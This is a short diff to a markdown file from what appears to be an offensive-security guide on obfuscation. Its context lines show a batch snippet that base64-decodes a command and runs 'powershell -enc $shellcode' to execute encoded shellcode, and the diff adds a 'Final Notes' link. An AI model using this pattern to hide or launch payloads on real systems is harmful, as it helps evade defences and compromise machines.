@@ -124,6 +124,7 @@ https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/p
        for /f "tokens=* delims=" %%# in ('powershell [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("""%base64string%"""^)^)') do set "decoded=%%#"
         cmd.exe /c powershell.exe -nop %decoded% -noni -enc $shellcode <-- here is our base64 syscall decoded
 
+![Final Notes:](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#final-notes)
 
 ---
 
